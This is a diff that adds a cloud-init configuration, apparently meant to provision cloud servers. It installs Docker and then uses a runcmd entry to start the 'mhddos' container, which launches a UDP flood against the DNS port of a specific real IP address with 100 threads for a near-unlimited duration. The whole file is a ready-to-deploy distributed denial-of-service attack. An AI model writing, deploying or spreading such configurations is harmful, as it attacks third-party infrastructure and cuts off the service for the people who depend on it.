@@ -1,0 +1,16 @@
+#cloud-config
+
+package_update: true
+packages:
+  - docker-ce
+  - docker-ce-cli
+  - containerd.io
+
+apt:
+  preserve_sources_list: true
+  sources:
+    docker-repo:
+      source: "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
+      keyid: 8D81803C0EBFCD88
+runcmd:
+  - "docker run --name mhddos --rm -d djebos/mhddos:latest udp 193.232.146.1:53 100 999999"
